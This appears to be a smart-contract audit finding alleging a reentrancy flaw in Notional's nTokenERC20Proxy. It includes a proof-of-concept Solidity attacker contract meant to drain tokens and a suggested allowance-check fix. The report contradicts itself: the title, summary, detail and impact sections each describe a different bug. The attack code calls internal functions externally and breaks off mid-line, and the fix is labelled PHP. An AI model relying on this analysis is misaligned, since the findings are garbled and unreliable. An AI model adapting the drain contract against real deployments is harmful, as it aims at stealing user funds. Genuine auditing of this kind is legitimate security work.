# " Unrestricted Token Minting and Redeeming in nTokenERC20Proxy Contract"

## Issues 

 vulnerable to reentrancy attacks 

The contract's `_transfer` and 
`_transferFrom` functions can be called by external contracts which can execute arbitrary code before the NOTIONAL.`nTokenTransfer` function is executed.

## Summary

This vulnerability can allow an attacker to bypass access control checks and execute unauthorized operations on the contract. The vulnerability exists because the `getPresentValueAssetDenominated` and 
`getPresentValueUnderlyingDenominated` 
functions have a naming convention that starts with "get" but they modify the state of the contract by calling the `NOTIONAL.nTokenPresentValueAssetDenominated `and `NOTIONAL.nTokenPresentValueUnderlyingDenominated` functions respectively. An attacker can exploit this vulnerability by calling the functions and modifying the contract's state without proper authorization

## Vulnerability Detail

```solidity
    function _transfer(address to, uint256 amount) internal override returns (bool) {
        return NOTIONAL.nTokenTransfer(currencyId, msg.sender, to, amount);
    }

    function _transferFrom(address from, address to, uint256 amount) internal override returns (bool) {
        return NOTIONAL.nTokenTransferFrom(currencyId, msg.sender, from, to, amount);
    }

```

The vulnerability in the code is that it allows an attacker to bypass the transfer approval mechanism and execute transfers on behalf of another user without their consent. This vulnerability exists in the  `_transferFrom` function, which allows an attacker to bypass the
` _allowance` check and transfer tokens from one user to another.
 This can result in unauthorized token transfers and potentially lead to the theft of user funds. The vulnerability could be mitigated by adding a check to ensure that the sender has the necessary approval to execute the transfer

## Impact

This vulnerability, can give the attacker to create a malicious contract that calls the `_transfer` function and within the same transaction, calls the malicious contract's own function. This can cause the `_transfer` function to be called again and again, recursively, leading to a reentrancy attack.

## Code Snippet

here is a simple example of an attack against the vulnerability

```solidity

pragma solidity ^0.8.0;

interface nTokenERC20ProxyInterface {
    function _transfer(address to, uint256 amount) external returns (bool);
}

contract Attacker {
    nTokenERC20ProxyInterface public victim;
    uint256 public count;

    constructor(address victimAddress) {
        victim = nTokenERC20ProxyInterface(victimAddress);
    }

    function attack() public {
        victim._transfer(address(this), 1 ether);
    }

    function drain() public {
        count++;
        if(count < 10) {
            victim._transfer(msg.sender, 1 ether);
        }
    }

    fallback() external payable {
        if(count <

```

## Recommendation
To fix this vulnerability, add a check to ensure that the sender has the necessary approval to execute the `transfer`.
This an example of how you can modify the `_transferFrom` function in the `nTokenERC20Proxy` contract to include the approval check

```php
function _transferFrom(address from, address to, uint256 amount) internal override returns (bool) {
    uint256 allowance = NOTIONAL.nTokenTransferAllowance(currencyId, from, msg.sender);
    require(allowance >= amount, "Transfer amount exceeds allowance");
    return NOTIONAL.nTokenTransferFrom(currencyId, msg.sender, from, to, amount);
}
```
With this modification, the _transferFrom function will first check that the sender (msg.sender) has the necessary approval (allowance) to transfer the desired amount of tokens from the from account. If the approval is not sufficient, the transfer will fail and an error will be thrown.
